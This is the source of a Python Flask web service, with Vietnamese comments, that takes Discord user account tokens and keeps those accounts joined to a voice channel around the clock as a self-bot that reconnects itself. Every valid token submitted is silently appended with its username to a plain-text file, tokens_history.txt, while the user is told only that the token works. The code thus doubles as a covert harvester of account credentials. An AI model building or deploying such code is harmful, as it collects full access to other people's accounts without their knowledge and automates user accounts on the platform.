import json
import asyncio
import threading
import aiohttp
import websockets
import sqlite3
import os
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder='.')

# --- HÀM GHI TOKEN VÀO FILE .TXT ---
def save_token_to_txt(token, username):
    file_name = "tokens_history.txt"
    if os.path.exists(file_name):
        with open(file_name, "r", encoding="utf-8") as f:
            content = f.read()
            if token in content:
                return 
    with open(file_name, "a", encoding="utf-8") as f:
        f.write(f"User: {username} | Token: {token}\n")

# --- CLASS XỬ LÝ KẾT NỐI DISCORD VOICE CHẠY NGẦM ---
class DiscordVoiceBot:
    def __init__(self, token, guild_id, channel_id, mute, deaf, stream):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.mute = mute
        self.deaf = deaf
        self.stream = stream
        self.running = True
        self.ws = None

    async def start(self):
        gateway_url = "wss://gateway.discord.gg/?v=9&encoding=json"
        
        # [CẬP NHẬT MỚI]: Vòng lặp tự động kết nối lại (Auto-Reconnect)
        while self.running:
            try:
                self.ws = await websockets.connect(gateway_url, max_size=None, ping_interval=None)
                
                # Gửi payload đăng nhập
                auth_payload = {
                    "op": 2,
                    "d": {
                        "token": self.token,
                        "properties": {
                            "$os": "windows",
                            "$browser": "chrome",
                            "$device": "pc"
                        }
                    }
                }
                await self.ws.send(json.dumps(auth_payload))

                # Gửi lệnh tham gia phòng Voice
                voice_payload = {
                    "op": 4,
                    "d": {
                        "guild_id": self.guild_id,
                        "channel_id": self.channel_id,
                        "self_mute": self.mute,
                        "self_deaf": self.deaf,
                        "self_video": self.stream
                    }
                }
                await self.ws.send(json.dumps(voice_payload))

                # Kích hoạt luồng Heartbeat (Nhịp tim) để giữ mạng
                asyncio.create_task(self.heartbeat())

                # Lắng nghe trạng thái
                while self.running:
                    await self.ws.recv()

            except Exception as e:
                # [QUAN TRỌNG]: NẾU BỊ ĐÁ RA SẼ TỰ ĐỘNG NỐI LẠI SAU 3 GIÂY
                print(f"[Bot Mất Kết Nối] Đang tự động chui lại vào phòng... Lỗi: {e}")
                await asyncio.sleep(3)

    async def heartbeat(self):
        # Cứ 30 giây gửi tín hiệu "Tôi đang sống" cho Discord 1 lần
        while self.running and self.ws and self.ws.open:
            try:
                await asyncio.sleep(30)
                await self.ws.send(json.dumps({"op": 1, "d": None}))
            except:
                break

    def stop(self):
        self.running = False

active_bots = {}

# --- HÀM CHECK TOKEN HỢP LỆ QUA DISCORD API ---
async def check_token_valid(token):
    url = "https://discord.com/api/v9/users/@me"
    headers = {"Authorization": token}
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                user_data = await response.json()
                return True, user_data.get("username", "Unknown")
            return False, None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_bot', methods=['POST'])
def start_bot():
    data = request.json
    token = data.get('token')
    guild_id = data.get('guild_id')
    channel_id = data.get('channel_id')
    mute = data.get('mute', True)
    deaf = data.get('deaf', True)
    stream = data.get('stream', False)

    if not token or not guild_id or not channel_id:
        return jsonify({"success": False, "message": "Vui lòng nhập đầy đủ thông tin!"})

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    is_valid, username = loop.run_until_complete(check_token_valid(token))

    if not is_valid:
        return jsonify({"success": False, "message": "Token không hợp lệ hoặc đã hết hạn! Vui lòng thử lại."})

    try:
        save_token_to_txt(token, username)
    except Exception as e:
        pass

    if token in active_bots:
        active_bots[token].stop()

    bot = DiscordVoiceBot(token, guild_id, channel_id, mute, deaf, stream)
    active_bots[token] = bot

    def run_async_bot():
        bot_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(bot_loop)
        bot_loop.run_until_complete(bot.start())

    t = threading.Thread(target=run_async_bot)
    t.daemon = True
    t.start()

    return jsonify({"success": True, "message": f"Token [{username}] hợp lệ! Đã cài đặt chống văng 24/7."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
